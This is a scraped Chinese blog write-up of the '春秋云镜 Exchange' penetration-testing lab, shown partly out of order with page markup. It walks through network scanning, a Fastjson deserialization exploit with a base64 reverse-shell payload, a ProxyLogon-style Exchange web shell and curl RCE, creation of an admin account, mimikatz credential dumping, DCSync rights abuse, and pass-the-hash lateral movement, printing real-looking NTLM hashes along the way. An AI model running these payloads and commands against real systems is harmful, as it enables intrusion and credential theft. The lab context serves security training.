[SUCCESS] 服务识别 172.22.3.9:6772 =\u003e 230[2025-04-09 00:53:13] [SUCCESS] 服务识别 172.22.3.9:7673 =\u003e 231[2025-04-09 00:53:13] [SUCCESS] 服务识别 172.22.3.9:6560 =\u003e 232[2025-04-09 00:53:15] [SUCCESS] 服务识别 172.22.3.9:8172 =\u003e 233[2025-04-09 00:53:20] [SUCCESS] 服务识别 172.22.3.9:443 =\u003e 234[2025-04-09 00:53:31] [SUCCESS] 端口开放 172.22.3.2:47001 235[2025-04-09 00:53:31] [SUCCESS] 端口开放 172.22.3.26:47001 236[2025-04-09 00:53:31] [SUCCESS] 端口开放 172.22.3.9:47001 237[2025-04-09 00:53:36] [SUCCESS] 服务识别 172.22.3.2:47001 =\u003e [http] 238[2025-04-09 00:53:36] [SUCCESS] 服务识别 172.22.3.9:47001 =\u003e [http] 239[2025-04-09 00:53:36] [SUCCESS] 服务识别 172.22.3.26:47001 =\u003e [http] 240[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49665 241[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49664 242[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49667 243[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49664 244[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49666 245[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49667 246[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49666 247[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49665 248[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49668 249[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49669 250[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49670 251[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49671 252[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49673 253[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49674 254[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49675 255[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49677 256[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49678 257[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49684 258[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49695 259[2025-04-09 00:53:39] [SUCCESS] 服务识别 172.22.3.2:49674 =\u003e [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 260[2025-04-09 00:53:55] [SUCCESS] 端口开放 172.22.3.2:52352 261[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49665 =\u003e 262[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49664 =\u003e 263[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49667 =\u003e 264[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49664 =\u003e 265[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49666 =\u003e 266[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49667 =\u003e 267[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49666 =\u003e 268[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49665 =\u003e 269[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49668 =\u003e 270[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49669 =\u003e 271[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49670 =\u003e 272[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49671 =\u003e 273[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49673 =\u003e 274[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49675 =\u003e 275[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49677 =\u003e 276[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49678 =\u003e 277[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49684 =\u003e 278[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49695 =\u003e 279[2025-04-09 00:54:46] [SUCCESS] 端口开放 172.22.3.9:64327 280[2025-04-09 00:54:46] [SUCCESS] 端口开放 172.22.3.9:64337 281[2025-04-09 00:54:50] [SUCCESS] 服务识别 172.22.3.2:52352 =\u003e 282[2025-04-09 00:54:51] [SUCCESS] 服务识别 172.22.3.9:64337 =\u003e 283[2025-04-09 00:55:41] [SUCCESS] 服务识别 172.22.3.9:64327 =\u003e 284[2025-04-09 00:55:41] [INFO] 存活端口数量: 130 285[2025-04-09 00:55:41] [INFO] 开始漏洞扫描 286[2025-04-09 00:55:41] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, rdp, smb, smb2, smbghost, smtp, webpoc, webtitle 287[2025-04-09 00:55:41] [SUCCESS] 网站标题 http://172.22.3.9 状态码:403 长度:0 标题:无标题 288[2025-04-09 00:55:41] [SUCCESS] NetInfo 扫描结果 289目标主机: 172.22.3.9 290主机名: XIAORANG-EXC01 291发现的网络接口: 292 IPv4地址: 293 └─ 172.22.3.9 294[2025-04-09 00:55:41] [SUCCESS] NetInfo 扫描结果 295目标主机: 172.22.3.2 296主机名: XIAORANG-WIN16 297发现的网络接口: 298 IPv4地址: 299 └─ 172.22.3.2 300[2025-04-09 00:55:41] [INFO] 系统信息 172.22.3.2 [Windows Server 2016 Datacenter 14393] 301[2025-04-09 00:55:41] [SUCCESS] NetBios 172.22.3.26 XIAORANG\\XIAORANG-PC 302[2025-04-09 00:55:41] [SUCCESS] NetBios 172.22.3.2 DC:XIAORANG-WIN16.xiaorang.lab Windows Server 2016 Datacenter 14393 303[2025-04-09 00:55:41] [SUCCESS] 网站标题 http://172.22.3.9:81 状态码:403 长度:1157 标题:403 - 禁止访问: 访问被拒绝。 304[2025-04-09 00:55:41] [SUCCESS] NetInfo 扫描结果 305目标主机: 172.22.3.26 306主机名: XIAORANG-PC 307发现的网络接口: 308 IPv4地址: 309 └─ 172.22.3.26 310[2025-04-09 00:55:41] [SUCCESS] NetBios 172.22.3.9 XIAORANG-EXC01.xiaorang.lab Windows Server 2016 Datacenter 14393 311[2025-04-09 00:55:42] [SUCCESS] SMTP服务 172.22.3.9:25 允许匿名访问 312[2025-04-09 00:55:42] [SUCCESS] 网站标题 https://172.22.3.9 状态码:302 长度:0 标题:无标题 重定向地址: https://172.22.3.9/owa/ 313[2025-04-09 00:55:42] [SUCCESS] 网站标题 https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f\u0026reason=0 状态码:200 长度:28237 标题:Outlook 314[2025-04-09 00:55:42] [SUCCESS] 网站标题 https://172.22.3.9:8172 状态码:404 长度:0 标题:无标题 扫到三台机子\n172.22.3.9 XIAORANG-EXC01\r172.22.3.2 DC:XIAORANG-WIN16.xiaorang.lab\r172.22.3.26 XIAORANG-PC 172.22.3.9上有一个exchange服务，有nday，直接上exprolog\n1python .\\exprolog.py -t 172.22.3.9 -e administrator@xiaorang.lab 2 3___________ __________ .__ 4\\_ _____/__ __\\______ \\_______ ____ | | ____ ____ 5 | __)_\\ \\/ /| ___/\\_ __ \\/ _ \\| | / _ \\ / ___\\ 6 | \\\u003e \u003c | | | | \\( \u003c_\u003e ) |_( \u003c_\u003e ) /_/ \u003e 7/_______ /__/\\_ \\|____| |__| \\____/|____/\\____/\\___ / 8 \\/ \\/ /_____/ 9 10[#] Trying to get target FQDN 11[+] Got target FQDN: XIAORANG-EXC01 12[#] Trying to get target LegacyDN and ServerID 13[+] Got target LegacyDN: /o=XIAORANG LAB/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=8ca6ff254802459d9f63ee916eabb487-Administrat 14[+] Got target ServerID: b5ebdaa1-b4b3-4b71-ab32-7d03b4955a75 15[#] Trying to get target user SID 16[+] Got target administrator SID: S-1-5-21-533686307-2117412543-4200729784-500 17[#] Trying to get target administrator cookie sessions 18[+] Got target administrator session ID: fefab382-b49c-4a85-a748-8cee14485956 19[+] Got target administrator canary session ID: atsaGpfQ70qSuQAOEtYUV5LqJeTxeN0IkjUqGKytbR0zbRHwhB5ynGGNyD8fBXd6AyUH2qDHj9M. 20[#] Trying to get target OABVirtualDirectory ID 21[+] Got target AOB ID: 6d8fb74b-8477-43ee-83ba-0b119205e85f 22[#] Trying to inject OABVirtualDirectory Shell 23[+] Shell are injected 24[#] Verifying OABVirtualDirectory Shell 25[+] AOB Shell verified 26[+] AOB Shell payload: http:\\/\\/ooo\\/#%3Cscript%20language=%22JScript%22%20runat=%22server%22%3Efunction%20Page_Load()%7Beval(Request%5B%22request%22%5D,%22unsafe%22);%7D%3C\\/script%3E 27[#] Trying to export OABVirtualDirectory Shell 28[+] Shell are exported 29[*] CURL Request: 30curl --request POST --url https://172.22.3.9/owa/auth/pjo2b.aspx --header 'Content-Type: application/x-www-form-urlencoded' --data 'request=Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"whoami /all\").stdout.readall())' -k 31[*] DONE 发现可以RCE\nproxychains4 curl --request POST --url https://172.22.3.9/owa/auth/pjo2b.aspx --header 'Content-Type: application/x-www-form-urlencoded' --data 'request=Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"whoami\").stdout.readall())' -k 写用户RDP上去拿flag\nnet user xrntkk abc123456 /add\rnet localgroup administrators xrntkk /add 1Yb dP 88 db dP\"Yb 88\"\"Yb db 88b 88 dP\"\"b8 2 YbdP 88 dPYb dP Yb 88__dP dPYb 88Yb88 dP `\" 3 dPYb 88 dP__Yb Yb dP 88\"Yb dP__Yb 88 Y88 Yb \"88 4dP Yb 88 dP\"\"\"\"Yb YbodP 88 Yb dP\"\"\"\"Yb 88 Y8 YboodP 5 6 7 / / 8 / / _ __ ( ) ___ 9 / / // / / // ) ) ) ) / / // ) ) 10 / / // / / // / / / / / / // / / 11/ /____/ / ((___( ( // / / / / / / ((___( ( 12 13 14 15flag02: flag{aefcc6d0-0d3c-44aa-b96c-c8ad50e6d2d4} FLAG4 信息收集一手\n这是域内的一台机子\n接着传个mimikatz，抓取哈希\n用管理员打开mimikatz\nlog\rprivilege::Debug sekurlsa::logonpasswords exit 抓到两个hash\n一个是机器用户的hash，一个是用户zhangtong\nAuthentication Id : 0 ; 10480581 (00000000:009febc5)\rSession : Interactive from 3\rUser Name : DWM-3\rDomain : Window Manager\rLogon Server : (null)\rLogon Time : 2025/4/9 20:32:31\rSID : S-1-5-90-0-3\rmsv :\r[00000003] Primary\r* Username : XIAORANG-EXC01$\r* Domain : XIAORANG\r* NTLM : 9b2081c3dc250a9b0a55c54c4dcc9cbb\r* SHA1 : 336d62cd7f3bc62aba936763ace82491e96f2eed\rAuthentication Id : 0 ; 105924 (00000000:00019dc4)\rSession : Service from 0\rUser Name : Zhangtong\rDomain : XIAORANG\rLogon Server : XIAORANG-WIN16\rLogon Time : 2025/4/9 19:36:36\rSID : S-1-5-21-533686307-2117412543-4200729784-1147\rmsv :\r[00000003] Primary\r* Username : Zhangtong\r* Domain : XIAORANG\r* NTLM : 22c7f81993e96ac83ac2f3f1903de8b4\r* SHA1 : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e\r* DPAPI : ed14c3c4ef895b1d11b04fb4e56bb83b 接下来利用system权限用bloodhound信息收集一波\nproxychains4 bloodhound-python -u \"XIAORANG-EXC01$\" --hashes :9b2081c3dc250a9b0a55c54c4dcc9cbb -d xiaorang.lab -dc XIAORANG-WIN16.xiaorang.lab -c all --dns-tcp -ns 172.22.3.2 --auth-method ntlm --zip 发现这台机子对域内的用户具有WriteDACL权限，也就是说我们可以利用机器用户给域内的用户添加dcsync权限，从而拿到域管的hash。\npython dacledit.py xiaorang.lab/XIAORANG-EXC01$ -hashes :9b2081c3dc250a9b0a55c54c4dcc9cbb -action write -rights DCSync -principal XIAORANG-EXC01$ -target-dn \"DC=xiaorang,DC=lab\" -dc-ip 172.22.3.2 接下来我们就可以利用dcsync去dump域管的hash了\nproxychains4 python3 psexec.py xiaorang.lab/XIAORANG-EXC01\\$@172.22.3.9 -hashes ':9b2081c3dc250a9b0a55c54c4dcc9cbb' -codec gbk c:\\\u003e .\\mimikatz.exe \"lsadump::dcsync /domain:xiaorang.lab /all /csv\" exit\r.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u003e https://blog.gentilkiwi.com/mimikatz\r'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )\r'#####' \u003e https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] 'xiaorang.lab' will be the domain\r[DC] 'XIAORANG-WIN16.xiaorang.lab' will be the DC server\r[DC] Exporting domain 'xiaorang.lab'\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502 krbtgt b8fa79a52e918cb0cbcd1c0ede492647 514\r1137 HealthMailboxeda7a84 1e89e23e265bb7b54dc87938b1b1a131 66048\r1138 HealthMailbox33b01cf 0eff3de35019c2ee10b68f48941ac50d 66048\r1139 HealthMailbox9570292 e434c7db0f0a09de83f3d7df25ec2d2f 66048\r1140 HealthMailbox3479a75 c43965ecaa92be22c918e2604e7fbea0 66048\r1141 HealthMailbox2d45c5b 4822b67394d6d93980f8e681c452be21 66048\r1142 HealthMailboxec2d542 147734fa059848c67553dc663782e899 66048\r1143 HealthMailboxf5f7dbd e7e4f69b43b92fb37d8e9b20848e6b66 66048\r1144 HealthMailbox67dc103 4fe68d094e3e797cfc4097e5cca772eb 66048\r1145 HealthMailbox320fc73 0c3d5e9fa0b8e7a830fcf5acaebe2102 66048\r1146 Lumia 862976f8b23c13529c2fb1428e710296 512\r500 Administrator 7acbc09a6c0efd81bfa7d5a1d4238beb 512\r1000 XIAORANG-WIN16$ 5410e4604b240a6d7bab43f67637b109 532480\r1147 Zhangtong 22c7f81993e96ac83ac2f3f1903de8b4 512\r1103 XIAORANG-EXC01$ 9b2081c3dc250a9b0a55c54c4dcc9cbb 4096\r1104 XIAORANG-PC$ fc840d385551c896c88c32a65ab5c5ad 4096\r1135 HealthMailbox8446c5b a79a671473279d21ca92fcc8251ec143 66048\r1136 HealthMailbox0d5918e 0e9b8e002d34d405e866b4820dfe36eb 66048\rmimikatz(commandline) # exit\rBye! 拿到域管hash，那我们接下来就可以随意横向了\n500 Administrator 7acbc09a6c0efd81bfa7d5a1d4238beb 512 横向拿flag\nproxychains4 python3 psexec.py administrator@172.22.3.2 -hashes ':7acbc09a6c0efd81bfa7d5a1d4238beb' -codec gbk c:\\Users\\Administrator\\flag\u003e type flag.txt\r____ ___.___ _____ ________ __________ _____ _______ ________\r\\ \\/ /| | / _ \\ \\_____ \\\\______ \\ / _ \\ \\ \\ / _____/\r\\ / | |/ /_\\ \\ / | \\| _/ / /_\\ \\ / | \\/ \\ ___\r/ \\ | / | \\/ | \\ | \\/ | \\/ | \\ \\_\\ \\\r/___/\\ \\|___\\____|__ /\\_______ /____|_ /\\____|__ /\\____|__ /\\______ /\r\\_/ \\/ \\/ \\/ \\/ \\/ \\/\rflag04: flag{204e2d62-c729-4840-8b25-a6c07b6aad44} 拿到flag4\nFLAG3 接下来横向去26拿flag3\nproxychains4 impacket-smbclient -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.26 -dc-ip 172.22.3.2 use C$\rcd /users/lumia/desktop 在C:\\users\\lumia\\desktop找到一个secret.zip，我们把它get下来\nsecret.zip里面有个flag.docx\n但是secret.zip需要密码\n这里要利用上面拿到的lumia的hash，将outlook中的邮件下载下来\n1146 Lumia 862976f8b23c13529c2fb1428e710296 512 python pthexchange.py --target https://172.22.3.9 --username Lumia --password \"00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296\" --action Download 拿到两封邮件\n第一封附件是刚刚的secret.zip，提示说用手机号解密\n第二封邮件中附件是一堆名字和手机号\n我们用手机号作为字典进行爆破\n18763918468 拿到flag3\n",
  "wordCount" : "5764",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-04-08T23:02:55+08:00",
  "dateModified": "2025-04-08T23:02:55+08:00",
  "author":{
    "@type": "Person",
    "name": "Xrntkk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-exchange-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>首页📔</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="归档">
                    <span>归档🗃️</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>标签🔖</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="搜索">
                    <span>搜索🔎</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/links/" title="友链🎈">
                    <span>友链🎈</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="关于">
                    <span>关于👨‍💻</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      春秋云镜-Exchange-Writeup
    </h1>
<div class="post-meta"><span title='2025-04-08 23:02:55 +0800 CST'>2025-04-08</span>&nbsp;·&nbsp;12 分钟&nbsp;·&nbsp;Xrntkk

<div class="meta-item">&nbsp·&nbsp
  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
  </div>      
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#flag1" aria-label="FLAG1">FLAG1</a></li>
                <li>
                    <a href="#flag2" aria-label="FLAG2">FLAG2</a></li>
                <li>
                    <a href="#flag4" aria-label="FLAG4">FLAG4</a></li>
                <li>
                    <a href="#flag3" aria-label="FLAG3">FLAG3</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p><em>靶标介绍：</em></p>
<p>Exchange 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 Flag，分布于不同的靶机。 *注意：该靶场只有4个flag，如果提交完4个flag后仍未攻克成功，请关闭环境提交反馈。</p>
<h3 id="flag1">FLAG1<a hidden class="anchor" aria-hidden="true" href="#flag1">#</a></h3>
<p>首先用fscan信息收集一手</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl"> .\fscan.exe -h 39.98.127.105 -p 1-65535
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">   ___                              _
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  / _ \     ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"> / /_\/____/ __<span class="p">|</span>/ __<span class="p">|</span> &#39;__/ _` <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">/ /_\\_____\__ \ (__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">(</span>__<span class="p">|</span>   &lt;
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">\____/     <span class="p">|</span>___/\___<span class="p">|</span>_<span class="p">|</span>  \__,_<span class="p">|</span>\___<span class="p">|</span>_<span class="p">|</span>\_\
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">                     fscan version: 1.8.1
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">start</span> infoscan
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="p">(</span>icmp<span class="p">)</span> Target 39.98.127.105   is alive
</span></span><span class="line"><span class="ln">11</span><span class="cl">[*] Icmp alive hosts len is: 1
</span></span><span class="line"><span class="ln">12</span><span class="cl">39.98.127.105:80 open
</span></span><span class="line"><span class="ln">13</span><span class="cl">39.98.127.105:22 open
</span></span><span class="line"><span class="ln">14</span><span class="cl">39.98.127.105:8000 open
</span></span><span class="line"><span class="ln">15</span><span class="cl">[*] alive ports len is: 3
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">start</span> vulscan
</span></span><span class="line"><span class="ln">17</span><span class="cl">[*] WebTitle:http://39.98.127.105      code:200 len:19813  title:lumia
</span></span><span class="line"><span class="ln">18</span><span class="cl">[*] WebTitle:http://39.98.127.105:8000 code:302 len:0      title:None 跳转url: http://39.98.127.105:8000/login.html
</span></span><span class="line"><span class="ln">19</span><span class="cl">[*] WebTitle:http://39.98.127.105:8000/login.html code:200 len:5662   title:Lumia ERP
</span></span><span class="line"><span class="ln">20</span><span class="cl">已完成 3/3
</span></span><span class="line"><span class="ln">21</span><span class="cl">[*] 扫描结束,耗时: 5m26.1641278s
</span></span></code></pre></div><p>80端口是一个介绍产品的网站</p>
<p><img alt="image-20250408231422505" loading="lazy" src="../assets/image-20250408231422505.png"></p>
<p>8000端口应该是网站的后台</p>
<p><img alt="image-20250408231526945" loading="lazy" src="../assets/image-20250408231526945.png"></p>
<p>看到后台可以注册用户，我们注册一个</p>
<p><img alt="image-20250408232901718" loading="lazy" src="../assets/image-20250408232901718.png"></p>
<p>成功进入后台</p>
<p>华夏ERP v2.3存在一处fastjson反序列化漏洞</p>
<p><a href="https://www.freebuf.com/articles/web/347135.html">Java 代码审计之华夏 ERP CMS v2.3 - FreeBuf网络安全行业门户</a></p>
<p><img alt="image-20250408234119162" loading="lazy" src="../assets/image-20250408234119162.png"></p>
<p><code>Fastjson</code>版本是 1.2.55</p>
<p>构造dns请求验证一下</p>
<pre tabindex="0"><code>{&#34;@type&#34;:&#34;java.net.Inet4Address&#34;,&#34;val&#34;:&#34;ysgbayuskh.iyhc.eu.org&#34;}
</code></pre><p><img alt="image-20250408234842947" loading="lazy" src="../assets/image-20250408234842947.png"></p>
<p>验证漏洞</p>
<p>这里我们可以通过evil-mysql-server和ysoserial构造恶意mysql服务打jdbc</p>
<pre tabindex="0"><code>./evil-mysql-server -addr 3366 -java java -ysoserial ysoserial-all.jar
</code></pre><p>exp</p>
<pre tabindex="0"><code>{
	&#34;name&#34;: {
		&#34;@type&#34;: &#34;java.lang.AutoCloseable&#34;,
		&#34;@type&#34;: &#34;com.mysql.jdbc.JDBC4Connection&#34;,
		&#34;hostToConnectTo&#34;: &#34;vpsIP地址&#34;,
		&#34;portToConnectTo&#34;: 3366,
		&#34;info&#34;: {
			&#34;user&#34;: &#34;yso_CommonsCollections6_bash -c {echo,base64编码后的命令}|{base64,-d}|{bash,-i}&#34;,
			&#34;password&#34;: &#34;pass&#34;,
			&#34;statementInterceptors&#34;: &#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&#34;,
			&#34;autoDeserialize&#34;: &#34;true&#34;,
			&#34;NUM_HOSTS&#34;: &#34;1&#34;
		}
	}
</code></pre><p>成功弹shell</p>
<p><img alt="image-20250409004552548" loading="lazy" src="../assets/image-20250409004552548.png"></p>
<p>有root权限，直接读flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">root@iZ8vb6bns5dh59k418a97hZ:/root/flag# cat f*
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">cat f*
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"> ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████ 
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"> ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░ 
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██         
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"> ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ 
</span></span><span class="line"><span class="ln">10</span><span class="cl">░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">                        <span class="p">|</span>  <span class="p">|</span>  <span class="p">||</span>  <span class="p">|</span> /~~\  /\  <span class="p">|</span>\  /<span class="p">|</span>~<span class="p">|</span>~
</span></span><span class="line"><span class="ln">13</span><span class="cl">                        <span class="p">|</span>  <span class="p">|</span>  <span class="p">||</span>--<span class="p">||</span>    <span class="p">|</span>/__\ <span class="p">|</span> \/ <span class="p">|</span> <span class="p">|</span> 
</span></span><span class="line"><span class="ln">14</span><span class="cl">                         \/ \/ <span class="p">|</span>  <span class="p">|</span> \__//    \<span class="p">|</span>    <span class="p">|</span>_<span class="p">|</span>_
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl">              flag01: flag{f605c397-0df7-4f55-b013-c7e45be124d0}
</span></span></code></pre></div><h3 id="flag2">FLAG2<a hidden class="anchor" aria-hidden="true" href="#flag2">#</a></h3>
<pre tabindex="0"><code>root@iZ8vb6bns5dh59k418a97hZ:/tmp# ip addr
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:1c:80:b4 brd ff:ff:ff:ff:ff:ff
    inet 172.22.3.12/16 brd 172.22.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe1c:80b4/64 scope link 
       valid_lft forever preferred_lft forever
</code></pre><p>传个fscan信息收集一波</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln">  1</span><span class="cl">root@iZ8vb6bns5dh59k418a97hZ:/tmp# ./fscan -h 172.22.3.0/24 -eh 172.22.3.12 -p 1-65535
</span></span><span class="line"><span class="ln">  2</span><span class="cl">┌──────────────────────────────────────────────┐
</span></span><span class="line"><span class="ln">  3</span><span class="cl">│    ___                              _        │
</span></span><span class="line"><span class="ln">  4</span><span class="cl">│   / _ \     ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __    │
